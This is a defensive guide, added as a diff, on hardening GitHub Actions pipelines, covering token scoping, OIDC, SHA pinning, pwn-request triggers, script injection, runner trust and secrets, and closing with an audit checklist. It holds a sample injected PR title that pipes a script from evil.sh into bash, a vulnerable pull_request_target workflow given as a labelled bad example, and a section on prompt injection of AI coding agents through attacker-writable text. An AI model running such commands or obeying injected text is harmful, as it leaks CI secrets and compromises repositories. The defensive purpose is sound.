@@ -1,0 +1,495 @@
+# 01 — Pipeline Security (CI workflows, tokens, triggers, runners)
+
+Scope: GitHub Actions primarily; the same principles map to GitLab CI, CircleCI, Buildkite.
+The pipeline is production infrastructure with code-execution-as-a-service attached to your
+secrets. Treat workflow files with the same review rigor as auth code.
+
+## 1.1 Least-privilege CI tokens
+
+**Rule: every workflow declares a top-level `permissions:` block; jobs elevate individually.**
+The implicit default (`write-all` on older repos, broad even on newer ones) means any
+compromised step — a malicious action, an injected script — can push code, rewrite releases,
+or poison caches.
+
+```yaml
+# GOOD — default deny, elevate per job
+permissions:
+  contents: read
+
+jobs:
+  release:
+    permissions:
+      contents: write        # create the release — only this job
+      id-token: write        # OIDC — only where federation happens
+    runs-on: ubuntu-latest
+```
+
+```yaml
+# BAD — no permissions block at all (inherits repo default),
+# or the lazy hammer:
+permissions: write-all
+```
+
+- Use `permissions: {}` when a workflow needs nothing (e.g., pure lint on checkout via a
+  read-only token still needs `contents: read` — `{}` only when no repo access at all).
+- `id-token: write` ONLY in jobs that actually federate. It mints identity tokens; an
+  attacker with script execution in that job can impersonate the workflow to your cloud.
+- Set the org/repo default token policy to read-only (Settings → Actions → Workflow
+  permissions) so a missing block fails safe. Audit: a missing top-level block is High if
+  the repo default is permissive, Medium if the default is read-only.
+- GitLab: use `CI_JOB_TOKEN` scoping (job token allowlist), not group-level PATs in
+  variables. Never store a PAT with `repo`/`api` scope as a CI secret when a scoped token
+  or GitHub App installation token (`actions/create-github-app-token`) suffices.
+
+## 1.2 OIDC to cloud — no stored cloud keys
+
+**Rule: long-lived cloud credentials (AWS keys, GCP SA JSON, Azure client secrets) must not
+exist in CI secrets.** They leak via logs, forks, compromised actions, and they never rotate.
+Every major cloud accepts the CI provider's OIDC tokens.
+
+```yaml
+# GOOD — AWS via OIDC
+- uses: aws-actions/configure-aws-credentials@<full-40-char-commit-sha>  # vN.N.N (§1.3)
+  with:
+    role-to-assume: arn:aws:iam::123456789012:role/repo-myorg-myrepo-deploy
+    aws-region: eu-central-1
+```
+
+The security lives in the **trust policy condition on the `sub` claim**:
+
+```json
+"Condition": {
+  "StringEquals": {
+    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
+    "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:environment:production"
+  }
+}
+```
+
+- BAD: `"sub": "repo:myorg/*"` or `StringLike` with `repo:myorg/myrepo:*` — any branch,
+  any fork-merged workflow, any PR environment in that repo can assume the role. Scope to
+  `ref:refs/heads/main` or better `environment:production` (environments add reviewer
+  gates, §1.7).
+- **Immutable subject claims:** pin the numeric-ID (`@id`) form of the `sub` claim; which repos
+  get it and why a name-only condition is unsafe: [`sota-secrets-management` rules/01](../../sota-secrets-management/rules/01-lifecycle-and-workload-identity.md) §5.
+- One role per repo × purpose (plan vs apply, push-to-registry vs deploy). A shared
+  "ci-role" with union permissions is a Critical finding when it spans prod write.
+- Audit greps: `AWS_SECRET_ACCESS_KEY`, `GOOGLE_APPLICATION_CREDENTIALS`, `AZURE_CLIENT_SECRET`
+  in workflow `env:`/secrets usage → High (Critical if reachable from fork PRs).
+
+## 1.3 Pin actions by commit SHA
+
+**Rule: third-party actions are pinned to a full 40-char commit SHA with a version comment.**
+Tags and branches are mutable; the tj-actions/changed-files compromise (2025) retagged
+existing versions to exfiltrate CI secrets from thousands of repos — SHA-pinned consumers
+were unaffected. The pattern keeps repeating: in March 2026 an attacker force-pushed 76 of
+77 aquasecurity/trivy-action tags (and all setup-trivy tags) to malicious commits (downstream, this
+compromised Checkmarx's release pipeline), and in May 2026 every tag of
+actions-cool/issues-helper was repointed to an imposter credential-stealing commit.
+Tag-pinned consumers ran the malware on their next scheduled job; SHA-pinned consumers
+did not.
+
+```yaml
+# GOOD — resolve the CURRENT release's commit SHA and pin that, tag in comment
+# (gh api repos/actions/checkout/commits/<tag> --jq .sha — NOT git/ref/tags, which returns the tag-object SHA for an annotated tag)
+- uses: actions/checkout@<full-40-char-commit-sha>  # vN.N.N
+# BAD
+- uses: someorg/some-action@v3        # mutable tag
+- uses: someorg/some-action@main      # tracking a branch — worse
+```
+
+- Pin transitively-trusted actions too (composite actions you own should pin their deps).
+- **A SHA pin is necessary but not sufficient — verify the SHA is a real commit in
+  the action's own repo.** GitHub stores a repo and its forks as one commit
+  "network", so a commit that exists only in an attacker's fork can be referenced by
+  the upstream `owner/repo@sha` slug (an "impostor commit"; the `github/dmca@565ece4`
+  case is the classic example). Run zizmor's `impostor-commit` audit (an online check
+  — needs a GitHub API token) in CI, and review external PRs that add/bump a pinned
+  SHA by confirming the commit on the claimant repo.
+- Keep pins fresh with Renovate (`helpers:pinGitHubActionDigests` preset) or Dependabot —
+  a stale pin is a vuln-management problem, an unpinned action is a supply chain hole.
+- `actions/*` (GitHub first-party) at a tag is tolerable (Low) but pin anyway for
+  consistency; everything else unpinned is High.
+- Enforce org-wide: Settings → Actions → "Allow specified actions" with an allowlist, plus the
+  native **"Require actions to be pinned to a full-length commit SHA"** policy (since
+  2025-08-15; a `!`-prefixed entry blocks an action or version). Reusable workflows can still
+  be referenced by tag under it, so pin those by review (§1.8); detect drift with zizmor or
+  OpenSSF Scorecard's Pinned-Dependencies check in CI. Action allowlisting is
+  available on all GitHub plans including Free since Feb 2026 — "we're on the free tier"
+  is no longer a reason to skip it.
+- Platform fixes are arriving piecemeal (as of 2026-09-26): **workflow execution protections**
+  (rules on who/what may trigger a workflow) are GA since 2026-09-17, and public repos with no
+  event policy get a default rule disabling `pull_request_target`, in evaluate mode until GitHub
+  enforces it from 2026-11-02. **Workflow dependency locking** (`gh actions-lock`, a lock of
+  every `uses:` to a commit) is a technical preview. Until locking is GA and adopted, SHA
+  pinning remains the control; don't accept "immutable actions will fix it" in review.
+- **Vet before you allowlist, and prefer fewer actions.** Each third-party action gets the
+  upstream-health check of [`rules/10`](10-inert-dependencies.md) §5 (owner, contributor count, last push, archived)
+  plus a read of the `permissions:` and secrets it asks for. An action that only wraps one
+  API call is better replaced by a `gh`/`curl` step — `gh` ships on GitHub-hosted runner
+  images. (OWASP: GitHub Actions Security cheat sheet)
+
+## 1.4 Untrusted PR code: `pull_request_target`, `workflow_run`, `issue_comment`
+
+**Rule: workflows triggered by privileged events must never execute attacker-controlled
+content.** This is the #1 CI compromise class ("pwn request").
+
+- `pull_request` from a fork: runs with read-only token, **no secrets** — safe by default.
+  Keep it that way: do not enable "send secrets to fork PRs".
+- `pull_request_target`: runs in the **base** repo context **with secrets and a write
+  token**, on the PR event. Safe only if it never checks out or executes PR head content.
+
+```yaml
+# CRITICAL vulnerability — classic pwn request
+on: pull_request_target
+jobs:
+  build:
+    steps:
+      - uses: actions/checkout@...
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}   # attacker's code
+      - run: npm ci && npm test                            # executes it with secrets present
+```
+
+Attacker path: open a PR whose `package.json` has a malicious `preinstall` script (or
+modified test) → exfiltrate `secrets.*` and the write-scoped `GITHUB_TOKEN` → push to main.
+
+Safe patterns, in order of preference:
+1. Don't use `pull_request_target` at all. Labeling/commenting bots can use a separate
+   workflow that only reads `github.event` metadata — no checkout.
+2. Two-workflow split: untrusted `pull_request` workflow builds/tests with zero secrets and
+   uploads results as an artifact; a `workflow_run` workflow with secrets downloads the
+   artifact and **treats it as hostile input** (validate schema, never execute, never pass
+   to a shell or `eval`-ish sink).
+3. If you must check out the PR in a privileged context (rare; e.g., trusted-path docs
+   preview), check out ONLY specific paths, require a maintainer-applied label
+   (`if: contains(github.event.pull_request.labels.*.name, 'safe-to-test')`) that is
+   re-applied per push, and run with minimal permissions and no cloud OIDC.
+
+Same logic applies to `issue_comment`-triggered "/test" bots: the comment author may not
+be the PR author; verify `author_association` is `MEMBER`/`OWNER` AND resolve the exact SHA
+that was reviewed, not the branch head (TOCTOU: attacker pushes after approval comment).
+Prefer a **label** as the approval signal: applying one needs triage access or above,
+while any account can post a comment.
+
+- **`workflow_run` is privileged even when its trigger was not.** GitHub's own docs state the
+  triggered run can access secrets and write tokens although the upstream run could not, so
+  its artifacts are attacker-writable input (artifact poisoning). Where both workflows are
+  yours and trusted, a `workflow_call` reusable workflow keeps the chain in one run.
+- **Where a privileged job must check out PR content at all (pattern 3), it uses the full
+  commit SHA that was approved, never a name.** `github.head_ref`,
+  `pull_request.head.ref`, `workflow_run.head_branch` and `refs/pull/N/head` all move when
+  the author pushes again. (OWASP: GitHub Actions Security cheat sheet)
+
+## 1.5 Script injection in workflow expressions
+
+**Rule: never interpolate attacker-influenced `${{ }}` expressions into `run:`, `script:`
+(github-script), or action inputs that reach a shell.** Expression expansion happens
+*before* the shell sees the text — quoting inside the script does not help.
+
+Attacker-controlled contexts include: `github.event.pull_request.title|body`,
+`github.event.issue.title|body`, `github.event.comment.body`, `github.head_ref` (branch
+name!), `github.event.pull_request.head.ref`, commit messages
+(`github.event.head_commit.message`), author names/emails, `github.event.review.body`.
+
+```yaml
+# BAD — title of `a"; curl evil.sh | bash; echo "` executes
+- run: echo "PR title: ${{ github.event.pull_request.title }}"
+
+# GOOD — env indirection; the value is data, not script text
+- env:
+    PR_TITLE: ${{ github.event.pull_request.title }}
+  run: echo "PR title: $PR_TITLE"
+```
+
+**The indirection is a *shell* defence — name the sink before calling it fixed.** Moving the
+value into `env:` stops the expression being expanded into *script text*, which is the whole
+threat when the sink is a shell. It does nothing about **reachability**: the value still
+arrives, and a sink that consumes it as *instructions* rather than as a shell word is exactly
+as exposed as before. An AI-agent prompt (§1.5a), a template engine, an `eval`, an LLM
+tool-call argument, a config parser that honours directives — all such sinks. Worse, the
+dangerous line now contains no `${{ }}`, so the YAML reads clean and the linters below have
+nothing to flag. Say which sink the defence neutralises; where the sink *interprets* the
+value, the fix is not to route attacker-controlled text into it at all.
+
+- In `actions/github-script`, same rule: pass via `env` and read `process.env`, or use
+  the provided `context` object — never template untrusted strings into the JS body.
+- `github.head_ref` in cache keys, artifact names, or `docker tag` arguments also needs
+  sanitization (branch names allow `/`, `$`, quotes).
+- Lint for this: `zizmor` and `actionlint` both flag expression injection — run them in CI
+  over `.github/workflows/`.
+- Severity: injection reachable from a fork PR/issue into a secrets-bearing job = Critical;
+  into a no-secret read-only job = Medium (still grants runner exec + token).
+
+### 1.5a AI coding agents are CI actors holding your token
+
+A step that invokes a coding agent (Claude Code Action, Gemini CLI, Codex, an inference
+action) takes **instructions** from whatever text it is handed and then acts with the job's
+token, network and filesystem. Audit it as a trust boundary, not as a build step. Nothing
+else in this file covers it, and the ordinary Actions checks do not: the dangerous
+configuration is usually valid YAML with no expression in it.
+
+- **Enumerate the triggers a non-collaborator can fire**, not the ones you had in mind:
+  `pull_request_target`, `issue_comment`, `issues`, `discussion_comment`, `workflow_run`.
+  "It only runs for maintainers" describes intent, not the trigger — opening an issue is not
+  a permission.
+- **Follow the value, not the syntax.** The common miss is the `env:` intermediary above: no
+  `${{ }}` appears anywhere near the prompt and the agent still receives attacker text. Trace
+  every input the agent can read — prompt fields, files it is pointed at, the diff itself —
+  back to whether an outsider can write it.
+- **A tool allowlist shrinks the surface; it does not close it.** Any member that can run a
+  command can substitute one (`echo "$(env)"` exfiltrates), and any member that writes a file
+  a later step executes escalates. Judge an allowlist by what its members *compose* into, not
+  by their names.
+- **Read the sandbox and approval flags as the security control they are.** Anything shaped
+  like "full access", `Bash(*)`, or an auto-approve/`--yolo` switch removes the boundary the
+  rest of the review assumes is there. A wildcard in a user allowlist does the same.
+- **Follow `uses:` into composite actions and reusable workflows.** An agent invoked two
+  levels down is invisible in the caller's YAML, and it is the caller's token it spends.
+- Severity: attacker-controlled text reaching an agent in a job that holds secrets or write
+  permissions = **Critical**; in a read-only, no-secret job = **Medium** (it still buys
+  runner execution and the default token). The instruction trust boundary itself is
+  [`sota-skill-security` rules/02](../../sota-skill-security/rules/02-trust-boundary-and-capability.md); prompt-injection mechanics are [`sota-code-security`
+  rules/08](../../sota-code-security/rules/08-llm-ai-security.md).
+
+## 1.6 Runner trust
+
+- **Never attach self-hosted runners to public repos** where fork PRs can schedule jobs:
+  that is remote code execution on your infrastructure by anonymous users. GitHub-hosted
+  only for public-repo PR workflows. (High→Critical depending on runner network position.)
+- Self-hosted runners must be **ephemeral** (one job, then destroyed — `--ephemeral`,
+  actions-runner-controller with ephemeral pods). Persistent runners accumulate
+  credentials, poisoned caches, and cross-job contamination.
+- Isolate runner network egress (no metadata-service access unless needed, egress
+  allowlists where feasible — exfiltration via `curl` is the standard post-exploit step;
+  tools like Harden-Runner provide egress auditing/blocking on hosted runners).
+- Cache poisoning: `actions/cache` is scoped, but a cache written by a default-branch
+  workflow is trusted by all branches. Never cache across trust boundaries (e.g., don't
+  restore caches written by PR workflows into release builds; scope keys by ref where the
+  content influences build output). **For release/publish/signing workflows, disable
+  build caching outright** — a single poisoned cache entry restored into a job that signs
+  or publishes taints the released artifact; the speedup isn't worth the supply-chain risk.
+  GitHub's `cache-mode` (workflow or job key, since 2026-09-10: `read`/`write`/`write-only`/
+  `none`; default `read` on low-trust events such as `pull_request_target`, `write` on `push`)
+  enforces it: `cache-mode: none` on release/sign jobs, `read` where untrusted code runs.
+- No interactive access into production runners (§1.10). The host under the runner is
+  [`rules/04`](04-build-containers.md) §4.6.1.
+
+## 1.7 Protected branches, environments, signed commits
+
+- Default branch protection (or rulesets, preferred — they apply to admins by default):
+  require PRs, ≥1 review (2 for prod-deploying repos), **dismiss stale approvals on new
+  push**, require status checks listed by exact name, block force-push and deletion,
+  require linear history if your audit story depends on it. "Include administrators" must
+  be on; an admin-bypassable gate is not a gate (High).
+- **Environments** for anything that deploys: `environment: production` with required
+  reviewers, wait timers if useful, and **deployment branch policy** restricted to
+  `main`/release tags. Secrets needed only for deploy live in the environment, not at repo
+  level — this is what makes the OIDC `sub` claim `environment:production` meaningful.
+- **Signed commits/tags**: enable "require signed commits" via ruleset on protected
+  branches when the team has signing set up (SSH signing keys or Sigstore `gitsign`).
+  Enable vigilant mode so unsigned/unverified shows explicitly. Don't claim integrity from
+  the green "Verified" badge alone — web-UI commits are signed by GitHub's key; decide
+  whether that satisfies your threat model and document it.
+- **Tag protection**: protect release tag patterns (`v*`) via rulesets — release pipelines
+  trust tags; anyone who can create `v1.2.4` can ship code (see [rules/02](02-provenance-signing.md) §release integrity).
+
+## 1.8 Workflow file ownership and change control
+
+- CODEOWNERS entry for `/.github/workflows/` (and composite actions, reusable workflows)
+  routing to the platform/security team. A workflow change IS a deployment-credential
+  change. Widen it to **every file that runs at build or install time**: `package.json`
+  (lifecycle scripts), Dockerfiles and compose files, Makefiles, `setup.py`/`pyproject.toml`,
+  `.npmrc`, files carrying `//go:generate`, deploy scripts, and agent rules files
+  (`AGENTS.md`, `CLAUDE.md`). CODEOWNERS only *requests* review; merges block only when the
+  branch rule or ruleset turns on required code-owner review. An AI agent's edit to these
+  paths gets the same human review. The May 2026 "Megalodon" campaign pushed
+  secret-stealing workflow commits to 5,500+ repos in a six-hour window — direct-push
+  rights to workflow files plus no workflow-modification alerting ([rules/07](07-runtime-ops.md) §7.3.1) is
+  exactly what it exploited. (OWASP: GitHub Actions Security cheat sheet; Secure Coding
+  with AI cheat sheet)
+- Reusable workflows (`workflow_call`) centralize hardened patterns: callers can't weaken
+  pinned steps inside them. Pin the reusable workflow reference by SHA too
+  (`uses: org/ci/.github/workflows/build.yml@<sha>`).
+- Forbid `workflow_dispatch` inputs flowing into shells unsanitized (same as §1.5) and
+  audit who has Actions write (can dispatch with arbitrary inputs).
+- Disable Actions entirely on repos that don't need it (org policy: "Allow select repos").
+
+## 1.9 Concurrency and run integrity
+
+- `concurrency:` groups on deploy workflows (`group: deploy-prod, cancel-in-progress:
+  false`) — two concurrent applies/deploys interleaving is a corruption class, and
+  cancel-in-progress on a deploy can kill a half-finished migration. Cancel-in-progress
+  *is* right for PR validation (saves runners, no integrity stake): [rules/16](16-fast-ci-without-blind-spots.md) §16.5.
+- Re-run semantics: re-running an old workflow run re-executes old workflow code with
+  *current* secrets — relevant after rotating a compromised workflow; revoke environments
+  or disable old runs rather than assuming history is inert.
+- Lint the workflow estate continuously: `zizmor` (injection, pwn-requests, unpinned,
+  excessive permissions, `impostor-commit`) and `actionlint` as a required check on
+  `.github/workflows/**` changes — the linters encode most of §§1.1–1.5 and catch
+  regressions humans rubber-stamp. Add **CodeQL's `actions` language** (GA April 2025;
+  auto-enabled in code-scanning *default setup* when workflow files are present, or add
+  `actions` to the language matrix in advanced setup) — it does taint/data-flow analysis
+  on workflows that the YAML linters can't.
+
+## 1.10 Secrets hygiene in CI
+
+- Secrets are masked in logs by value-match only: derived values (base64 of a secret, a
+  URL embedding it) print in cleartext. Register any value you compute from a secret with
+  `echo "::add-mask::$VALUE"` before it can be printed. Never log request bodies/headers
+  in CI; set `ACTIONS_STEP_DEBUG` consciously.
+- **No interactive observation of a production pipeline.** No SSH-into-the-runner debug
+  actions (tmate/upterm-style) in protected workflows, no `pods/exec`/`pods/attach` on
+  runner pods, and `ACTIONS_STEP_DEBUG`/`ACTIONS_RUNNER_DEBUG` unset for protected
+  workflows. Anyone who can run a workflow can also turn debug logging on for a re-run.
+  (OWASP: Secrets Management cheat sheet)
+- **Never `secrets: inherit` when calling a reusable workflow** — it hands the called
+  workflow *every* secret in scope. Pass each secret explicitly with `secrets:`
+  (least privilege), and pin the reusable workflow by SHA (§1.8).
+- Scope: org secret < repo secret < environment secret. Push every prod credential down to
+  an environment with required reviewers. **Inside the job, inject a secret through `env:` on
+  the one step that uses it**, never workflow- or job-level `env:`, where every step,
+  including third-party actions, receives it. (OWASP: GitHub Actions Security cheat sheet)
+- No secrets in `if:` conditions or step outputs (outputs are visible to later steps of
+  other jobs via needs-context and stored in logs metadata).
+- Rotate on any workflow-compromise suspicion; assume any secret present in a job's env at
+  the time of a malicious step is gone.
+- Prefer fetching at use-time from a secrets manager via OIDC (Vault JWT auth, AWS Secrets
+  Manager) over storing in GitHub at all — central audit + rotation.
+
+## 1.10a Bot PRs get no repository secrets — and a gate that needs one will fail
+
+Dependabot and Renovate open PRs on **same-repo branches**, so any workflow condition
+written as *"this is a trusted run"* — `github.event.pull_request.head.repo.full_name ==
+github.repository` — is **true** for them. But their token is denied **repository**
+secrets. A gate whose scanner depends on a secret therefore either fails on every bot PR,
+or, if the gate degrades quietly, **passes while scanning less than it claims**.
+
+Both outcomes are bad, and the second is worse. A required check that is permanently red
+trains people to bypass it; a check that silently drops to a reduced ruleset reports the
+same green either way ([`sota-code-security` rules/10](../../sota-code-security/rules/10-silent-control-failure.md)).
+
+Ordered by preference:
+
+1. **Give the bot its own copy.** GitHub keeps a **separate Dependabot secret store** —
+   populating the repository secret does not populate it. Verify by listing both; an empty
+   bot store is the usual root cause.
+2. **Make degradation loud where it matters.** If the scanner can run reduced, assert the
+   secret's presence on trusted runs and fail with a message naming what would be skipped
+   — an absent input must not look like a clean scan.
+3. **Do not special-case the bot.** `if: github.actor != 'dependabot[bot]'` turns a red
+   check green while removing the control precisely on the PRs that change your dependency
+   graph. It is the shape [rules/10](10-inert-dependencies.md) exists to catch, dressed as a CI fix.
+
+**Value shape bites too.** A secret is one opaque string; the file it mirrors may not be.
+Copy the form the consumer *reads* (e.g. a pipe-joined regex), not the file's on-disk
+layout, or the secret is present and inert.
+
+**What the bot maintains, it maintains narrowly.** Dependabot rewrites the trailing
+`# vX.Y.Z` beside a SHA pin (§1.3) and nothing else — a version named in a nearby prose
+comment goes stale the moment a bump lands. Keep one source of truth per fact.
+
+## 1.11 Prove the pipeline runs — before you trust anything it reports
+
+Every section above hardens a pipeline. None of them establishes that it has ever
+executed. A workflow that has never run is not "probably fine": it is untested code
+that gates your merges, and it fails in ways review does not catch — a workflow-wide
+env var the first step rejects, a tool that is not on the runner, a path that only
+exists in the author's tree.
+
+- **Run the jobs locally against a fresh clone of committed state**, not the working
+  tree. The working tree hides dependence on untracked files, and that dependence is
+  the most common reason a green local run turns red on a runner.
+- **Treat missing tooling as a hard failure, not a skip.** A local harness that skips
+  the step it cannot run reports success for work it never did — [`sota-code-security` rules/14](../../sota-code-security/rules/14-control-not-in-force.md) §4 in
+  your own scaffolding. Print what was substituted (a marketplace action replaced by
+  its CLI equivalent) rather than hiding it, so the run's coverage is legible.
+- **Do this even when CI works.** It is the only way to prove a workflow before its
+  first push, and it turns a 10-minute push/wait/fix loop into seconds.
+- Off-the-shelf local runners for GitHub Actions exist; evaluate one against your
+  workflow before adopting it, and do not assume action-for-action fidelity.
+
+Then check the run history itself, per [`sota-code-security` rules/14](../../sota-code-security/rules/14-control-not-in-force.md) §4: a job that
+was **skipped** reports Success, and a run the platform **refused** (billing, spending
+limits) reports failure within seconds with no step logs and its reason only in the
+annotations. Both look like "CI exists" from the badge.
+
+## 1.11a Copying a step between sibling pipelines rebinds it to names the destination may not declare
+
+§1.11 establishes that a pipeline has *ever* executed. This is the case where **N sibling
+pipelines** exist, one is edited by copying a block from another, and the copied block
+references a name only the *source* declares.
+
+**Late-bound references are resolved by the orchestrator, not by the parser.** `${{ }}` /
+`{{ }}` expressions, template outputs, job and step IDs, matrix keys, secret and variable
+names — all bind at submission or run time. So a copied block passes YAML validation,
+schema validation, lint and pre-commit while being **unrunnable**, and near-identical
+pipelines are exactly where the same concept is most likely to carry a different name.
+
+Field-reported: three sibling build templates. Two expose a `check-changes` output named
+`should-build`; the third names the same concept `has-changes`. A task copied from the
+first into the third carried `should-build`. YAML parsed, the schema validated, kustomize
+built, yamllint passed, the pre-commit hook passed. It resolved only at submission, where
+the orchestrator rejected the **entire** spec:
+
+```
+invalid spec: templates.build-pipeline.tasks.promote failed to resolve
+{{tasks.check-changes.outputs.parameters.should-build}}
+```
+
+It would have failed **every** build of that service, and was caught only because each of
+the three was given its own forced verification run instead of one shared *"the pattern is
+identical"* assumption.
+
+**After copying a block between pipelines, diff the identifiers it references against what
+the destination actually declares.** The mechanical check is cheap: for every conditional
+and every interpolated output, assert the referenced name appears in the producing step's
+declared outputs *in that file*.
+
+**Then execute each target once.** N pipelines edited from one template is N things to
+prove, not one — *"same pattern, therefore same result"* is precisely the assumption
+identifier drift defeats. For a scheduled pipeline the first real execution may be hours
+away and unattended, which is also why a gate step copied across services must carry its
+durable verdict everywhere ([`rules/11`](11-after-the-gate-fails.md) §4), not just where it was first fixed.
+
+## Audit checklist
+
+- [ ] **Does any workflow hand attacker-writable text to an AI coding agent (§1.5a)?** Trace
+      the value, not the syntax — an `env:` intermediary leaves no `${{ }}` near the prompt
+      and the agent still receives it. Check the triggers a non-collaborator can fire, the
+      sandbox/approval flags, wildcards in user allowlists, and agents invoked through
+      `uses:` two levels down. The `env:` fix in §1.5 is a *shell* defence and does not apply
+      to a sink that interprets the value.
+- [ ] **Does every late-bound reference resolve against a name that pipeline itself
+      declares?** `${{ }}`/`{{ }}` expressions, template outputs, step IDs, matrix keys — they bind
+      at submission, so lint and schema validation pass on an unrunnable spec. After copying a step
+      between sibling pipelines, **each destination has been executed once**, not just the source
+      (§1.11a).
+
+- [ ] **Bot PRs are green for the right reason.** Open the newest Dependabot/Renovate PR:
+      does every required check pass, and does the secret-dependent one actually have its
+      secret? `gh secret list` and `gh secret list --app dependabot` are different stores —
+      an empty bot store with a populated repository store is the tell. A gate exempted for
+      `dependabot[bot]` is a finding, not a fix (High). Where the scanner can run reduced, the gate asserts its secret is present and fails naming what it would skip (§1.10a).
+- [ ] **No workflow condition treats "same-repo branch" as "has secrets."** (§1.10a) Bot branches
+      satisfy `head.repo.full_name == github.repository` and still receive nothing.
+
+- [ ] **Has this pipeline ever executed?** Count non-skipped, non-refused runs. A
+      skipped job reports Success and a platform-refused run fails in seconds with no
+      step logs — neither is evidence the workflow works. If it has never run green,
+      execute the jobs locally against a fresh clone (committed state, not the working tree) before trusting any gate it claims; a local harness that skips a step for missing tooling counts that step as not run (§1.11).
+- [ ] Every workflow has a top-level `permissions:` block; no `write-all`; `id-token: write` only in federating jobs; the repo/org default token is read-only (`gh api repos/O/R/actions/permissions/workflow --jq .default_workflow_permissions` prints `read`) and no `repo`/`api`-scoped PAT sits in CI secrets where a GitHub App installation token suffices (§1.1)
+- [ ] No long-lived cloud keys in secrets; OIDC trust policies pin `aud` and an exact `sub` (repo + ref/environment, no wildcards; the numeric `@id` form where the repo carries immutable subject claims); one cloud role per repo × purpose, a shared role spanning prod write = Critical (§1.2)
+- [ ] All third-party actions pinned to full commit SHAs with version comments (§1.3); pins maintained by Renovate/Dependabot; org actions-allowlist enabled
+- [ ] No `pull_request_target`/`workflow_run` job checks out or executes PR head content while secrets/write token are present (§1.4); label gates (if any) re-applied per push and SHA-pinned at approval
+- [ ] No untrusted context (`title`, `body`, `head_ref`, commit message, comment) interpolated into `run:`/`github-script`/shell-reaching inputs — all via `env:` (§1.5); zizmor/actionlint run in CI
+- [ ] Self-hosted runners: none on public repos; ephemeral; egress monitored; caches not shared across trust boundaries; release/publish/signing jobs restore no build cache (`cache-mode: none`, or no cache step) (§1.6)
+- [ ] Default branch ruleset: PR + review required, stale-approval dismissal, exact required checks, no force-push, applies to admins; release tags protected; signed commits required on protected branches, or their absence (and whether GitHub-signed web-UI commits count) recorded as a threat-model decision (§1.7)
+- [ ] Deploy jobs use `environment:` with required reviewers and branch policy; prod secrets live at environment scope; every deploy/apply workflow sets `concurrency:` with `cancel-in-progress: false` (§1.9, Medium — interleaved applies corrupt state, a cancelled deploy can kill a half-finished migration)
+- [ ] CODEOWNERS covers `.github/workflows/` (§1.8), so a gated change cannot rewrite its own gate unreviewed; reusable workflows pinned by SHA
+- [ ] **Build-executing files owned and owner review enforced (§1.8), High if missing:** list them with `git ls-files | grep -E '(^|/)(package\.json|Dockerfile[^/]*|docker-compose[^/]*\.ya?ml|compose\.ya?ml|Makefile|setup\.py|pyproject\.toml|\.npmrc|AGENTS\.md|CLAUDE\.md)$|^\.github/'` plus `grep -rln '//go:generate' .` and match each against CODEOWNERS; `gh api repos/O/R/rules/branches/main --jq '[.[]|select(.type=="pull_request")|.parameters.require_code_owner_review]|any'` (or classic protection `.required_pull_request_reviews.require_code_owner_reviews`) must print `true`
+- [ ] **Privileged jobs check out by SHA (§1.4), High:** `grep -rn -E 'ref:[[:space:]]*\$\{\{[[:space:]]*github\.(head_ref|event\.pull_request\.head\.ref|event\.workflow_run\.head_branch)|refs/pull/' .github/workflows` has no hit in a `pull_request_target`/`workflow_run`/`issue_comment` job
+- [ ] **No interactive debug path into production runners (§1.10), High:** `grep -rn -E 'tmate|upterm|debugger-action|pods/exec|pods/attach' .github/workflows <runner-RBAC-dir>` is empty; `gh variable list` and `gh secret list` show no `ACTIONS_STEP_DEBUG`/`ACTIONS_RUNNER_DEBUG`
+- [ ] **Third-party actions inventoried and vetted (§1.3), Medium:** `grep -rhn -E 'uses:[[:space:]]*[A-Za-z0-9_-][A-Za-z0-9_.-]*/' .github/workflows | grep -v -E 'uses:[[:space:]]*(actions|github)/'` — each hit has an upstream-health record, or is replaced by a `gh` step
+- [ ] No secrets echoed, embedded in URLs, or passed through step outputs; rotation path documented; no `secrets: inherit` (§1.10): `grep -rn -E '^[^#]*secrets:[[:space:]]*inherit' .github/workflows` is empty (zizmor's `secrets-inherit` audit flags the same)
+- [ ] **Secrets scoped to the step (§1.10), Medium:** `find .github/workflows -name '*.y*ml' -print0 | xargs -0 -r yq '(.env // {} | to_entries | .[] | select(.value | tostring | test("secrets\.")) | "workflow env: " + .key), (.jobs // {} | to_entries | .[] | .key as $j | .value.env // {} | to_entries | .[] | select(.value | tostring | test("secrets\.")) | "job " + $j + " env: " + .key)'` prints nothing (a `*.yml` glob misses `.yaml` files, and zsh aborts on a glob with no match)
